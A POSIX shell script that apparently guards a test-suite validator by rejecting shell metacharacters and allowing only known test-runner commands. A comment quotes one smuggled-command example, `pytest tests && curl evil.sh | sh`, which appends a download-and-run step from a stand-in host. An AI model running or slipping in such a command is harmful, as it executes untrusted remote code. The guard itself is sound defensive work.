#!/bin/sh
# check-test-command.sh — allowlist guard for improving-test-suites validator.
# Usage: check-test-command.sh "<command string>"
# Exit 0 if the command matches a known test runner prefix; 1 otherwise; 64 usage.
set -eu

if [ "$#" -ne 1 ]; then
  printf '%s\n' "usage: $0 \"<command string>\"" >&2
  exit 64
fi

newline='
'
# Reject shell metacharacters so an allowed runner prefix cannot smuggle a
# compound command (e.g. `pytest tests && curl evil.sh | sh`).
case "$1" in
*';'* | *'&'* | *'|'* | *'`'* | *'$('* | *'>'* | *'<'* | *"$newline"*)
  printf '%s\n' "command contains shell metacharacters: $1" >&2
  exit 1
  ;;
esac

# A trailing space lets each prefix pattern match both bare runners and arguments.
case "$1 " in
pytest\ * | \
  python\ -m\ pytest\ * | \
  go\ test\ * | \
  npm\ test\ * | \
  yarn\ test\ * | \
  pnpm\ test\ * | \
  npx\ vitest\ * | \
  npx\ jest\ * | \
  cargo\ test\ * | \
  mvn\ test\ * | \
  ./gradlew\ test\ * | \
  rspec\ * | \
  mix\ test\ *)
  exit 0
  ;;
*)
  printf '%s\n' "command not on test-runner allowlist: $1" >&2
  exit 1
  ;;
esac
